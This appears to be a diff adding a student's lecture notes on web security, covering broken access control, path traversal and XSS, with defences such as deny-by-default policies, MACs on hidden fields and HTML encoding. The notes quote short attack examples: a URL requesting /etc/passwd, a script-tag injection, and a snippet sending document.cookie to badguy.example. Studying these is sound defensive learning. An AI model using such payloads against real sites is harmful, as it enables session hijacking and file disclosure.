@@ -413,3 +413,69 @@ Client != Browser
 
 Get and POST
 ![](../img/Pasted%20image%2020251023195448.png)
+
+RFC 3986
+![](../img/Pasted%20image%2020251028201728.png)
+
+```
+javascript://expmple.com/%0alert(1)
+malito://user@example.com
+```
+### Broken access control
+#### Object references
+PHP: arbitrary file access
+```
+http://researchsite.ed.ac.uk/showhtml.php?title=User+Manual&file=%2Fetc%25passwd
+```
+- the app developer (implicitly) authorized users, no explicit authorization code was written, should have a *re-authorization* step
+- PHP code didnt check the filename returned
+- Should only allow access to its own recouces
+
+Data indirection: index or hash table using for eliminate direct chosen data/file access
+
+Hidden input of the server: To prevent *client-side tampering*, a *MAC* (Message Authenticate Code) constructed with a **server-side secret key**, validate after form submission (return to the server)
+- data integrity guarentee
+
+Other mistakes:
+*Assuming requestss occour in proper order*
+- assuming user must issue a GET to retrieve a form then POST
+*Authorization by obscurity*
+- a web page is not linked to the main site, assuming that only people who are given it (know it in advance) will be able to reach it
+
+#### Function access
+Much more dangerous
+- Hiding nevigation (admin) links to unauthorized sections
+- wrongly assuming this prevents non-authorized users visiting them
+
+Well-specified polity
+Manage authorization in a separate module
+Make authorzation chesks for each fucntion
+*Deny-by-default* policy
+
+![](../img/Pasted%20image%2020251028205716.png)
+
+#### XSS and Output Filtering
+Attacker tricks app into displaying malicious code
+*Session hijacking*: steal session cookies
+![](../img/Pasted%20image%2020251028210047.png)
+
+```javascript
+<script>  
+	document.location.replace(  
+	"http://www.badguy.example/steal.php"  
+	+ "?what=" + document.cookie)  
+</script>
+```
+
+*Persistent XSS*: malicious code is stored on the server, many visitors might execute it 
+*Reflected XSS*: injected malicious code, immidiately dislayed in the visited page
+```
+http://mymanpages.org/manpage.php?title=<script>...</script>?program=gcc
+```
+
+***Always check your outputs***
+
+Solutions
+- HTML encoding
+- Marked up output: complex filtering: rule out risky tags
+- Marked up output: DSL: Domain Specific Language, convert to secure HTML (eliminated risky tags)
